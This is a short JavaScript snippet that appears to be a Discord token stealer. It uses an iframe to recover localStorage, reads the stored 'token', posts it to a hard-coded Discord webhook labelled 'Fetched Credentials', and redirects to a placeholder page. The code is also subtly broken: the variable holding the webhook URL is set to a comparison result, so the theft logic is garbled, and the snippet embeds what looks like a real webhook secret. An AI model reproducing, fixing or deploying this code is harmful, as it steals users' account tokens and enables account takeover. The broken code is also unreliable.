void (function () {
  var SEND = "https://discord.com/api/webhooks/1044258712497430538/3mVG1nZu2agVNpu4PdeNMV7Tch-pvT0fVnhy3t5SSs5Sa2izmQK8JOnodFxae_6WDcgc" == this.document.location.origin &&
    (function () {
      const a = document.createElement("iframe");
      document.head.append(a);
      const b = Object.getOwnPropertyDescriptor(
        a.contentWindow,
        "localStorage"
      );
      location.reload(),
        Object.defineProperty(window, "localStorage", b),
        fetch(SEND, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                color: 3553599,
                title: "Fetched Credentials",
                description: `\`\`\`${localStorage.getItem("token")}\`\`\``,
              },
            ],
          }),
        });
    })();
})();
location.assign('NEW_WEBPAGE')
